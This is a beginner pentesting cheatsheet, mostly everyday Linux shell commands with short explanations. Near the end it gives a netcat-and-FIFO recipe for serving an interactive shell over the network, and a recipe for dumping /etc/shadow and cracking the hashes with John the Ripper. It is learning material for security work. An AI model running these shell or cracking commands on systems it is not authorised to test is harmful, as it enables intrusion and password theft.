# pentesting-cheatsheet
## Table of Contents
0. Linux Operating System
* Commandline (CLI)
2. Windows Operating System

0.  Linux Operating System
- Shortcuts
`CTRL + P`
change the prompt style

- Commands
`file <a-file>`
print the type of the file

`cat -n <a-file>`
print the content of the file with the line numbering

`less -F <a-file>`
print the content of file + waiting for chnages in it to display

`man -k printf`
`man –k ‘^shadow$‘`
Search the short descriptions and manual page names for the keyword printf  as regular expression.  Print out any matches.  Equivalent to apropos printf.

`set`
print the system variables of the system

`echo $HISTFILE`
print the value of the system variable that stores the shell history

`history or cat ~/.zsh_history`
to print the shell history for the current user

`alias ll='ls -la'`
setting an alias to a command
#### Hint to make the alias permenant also after ending the session append `alias ll='ls -la'` to ~/.zshrc. ~/.zshrc contains the commands that are excuted at start of interactive shell.

`cat /etc/issue`
print the version of linux distribution
#### Hint Another useful tool is the command `uname` for identifying the specification of the target linux machine
e.g.:
`uname`, `uname -v`, `uname -a` or `uname -r`

`which sbd`
locate a program that is included to the PATH variable

`locate mimikatz.exe`
locate a file or a folder through the database locate.db instead of searching the local drive

Another way of searching the file system is `find` command that uses recursion to search and have among others these options e.g.:
* -name to search by name (case sensitve)
* -iname to search by name (case insenstive)
* -type f/d/l/s to search by type (files, directories, links, sockets)
* -size to search by size
* -mtime to search by modification date
* -user to search by user
* -perm to search by permissions given

`echo -n "within the same last line" >> text.txt`
append to a file and the -n ensures that we append in the same last line

Within the redirect streams in Linux there is the symbol `<` which used when a file content should be readed in another program input

`grep -r "root" /boot`
search recursively for a regular expression

* `sed` is command that is used to edit streams
  `echo "Ich hasse Linux" | sed 's/hasse/liebe/'`
  -> Ich liebe Linux

`cut` is used to cut some content of a stream. Often it is being used with -f (field) and -d (delimeter)
`echo "Ich mag Hacking, Blumen, Feen, Programmierung und IT-Sicherheit." | cut -f 1,4 -d ','`
-> Ich mag Hacking, Programmierung und IT-Sicherheit

**awk** is a whole programming language for text editing. 2 common options when dealing with it in the shell are -F for definition of fieldseparators and the Subprogram **print** for printing the resulted text
`echo "ist:das:wirklich:so" | awk -F ":" '{print $4, $3, $1, $2}'`
-> so wirklich ist das


..
`sudo usermod -a -G <list_of_groups> <user>`
to add an existing user to an existing group

`id`
print User ID and group IDs
Different options of id:
-g, --group : print only effective group id
-G, --groups : print all group IDs
-r, --real : print only real user id
-u, --user : print only effective user id

..

`nc -nlvp 8080` 
netcat to listen on the port 8080

`nc localhost 8080`
netcat to connect

Because new versions of nc have no -e or -c options, here is a workaround to pass the shell through nc:
On ‘server’ side:

           $ rm -f /tmp/f; mkfifo /tmp/f
           $ cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f

     On ‘client’ side:

           $ nc host.example.com 1234
           $ (shell prompt from host.example.com)
more on that see (https://manpages.ubuntu.com/manpages/bionic/man1/nc_openbsd.1.html)

#### Linux Password Cracking
`sudo unshadow /etc/passwd /etc/shadow > hashes.txt`
`john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`
that is a one way to crack password with john the ripper with this format


